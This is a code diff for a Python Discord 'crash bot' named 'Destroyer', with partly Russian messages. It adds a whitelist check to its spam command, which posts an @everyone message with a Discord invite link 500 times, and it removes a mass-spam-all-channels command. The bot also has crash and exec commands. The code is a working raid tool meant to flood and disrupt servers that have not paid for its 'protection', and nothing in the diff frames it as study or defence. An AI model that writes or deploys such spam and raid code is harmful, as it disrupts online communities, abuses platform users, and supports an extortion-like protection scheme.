@@ -16,6 +16,8 @@ client.remove_command('help')
 global webhook
 webhook = Webhook(settings['WEBHOOK'])
 
+global slist
+slist = [802363338914791495, 835425510333874187]
 
 def localtime():
 	time = datetime.datetime.now()
@@ -28,8 +30,6 @@ async def on_ready():
 
 @client.command()
 async def crash(ctx):
-	slist = [802363338914791495, 835425510333874187]
-	mlist = []
 	scheck = ctx.guild.id in slist
 	if scheck == False:
 		await ctx.send("huh :)")
@@ -156,11 +156,15 @@ async def crash(ctx):
 
 @client.command(aliases=['spam'])
 async def __spam(ctx):
-  for i in range(500):
-    try:
-      await ctx.send('@everyone S3rv3r crash9d by new crash bot: Destroyer!\n\Ссылка на сервер: https://discord.gg/43GtxcFXPK')
-    except:
-       break
+	scheck = ctx.guild.id in slist
+	if scheck == False:
+		for i in range(500):
+			try:
+				await ctx.send('@everyone S3rv3r crash9d by new crash bot: Destroyer!\n\Ссылка на сервер: https://discord.gg/43GtxcFXPK')
+			except:
+				break
+	else:
+		await ctx.send(f'Извени, но на сервере нельзя спамить, т.к владелец молодец, купил защиту от бота. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')
 
 @client.command(aliases=['exec'])
 async def ex(ctx, *, cmd=None):
@@ -173,15 +177,5 @@ async def ex(ctx, *, cmd=None):
 			await ctx.send(f'An error occured in this command:\n```{cmd}\n```')
 	else:
 		await ctx.send('Нельзя :)')
-
-@client.command(aliases=['spamall'])
-async def __spamall(ctx):
-	for guild in client.get_guild(ctx.guild.id):
-		for channel in guild.text_channels:
-			for i in range(20):
-				try:
-					await ctx.send('@everyone S3rv3r crash9d by new crash bot: Destroyer!\n\Ссылка на сервер: https://discord.gg/43GtxcFXPK')
-				except:
-					break
 
 client.run(settings['TOKEN'])
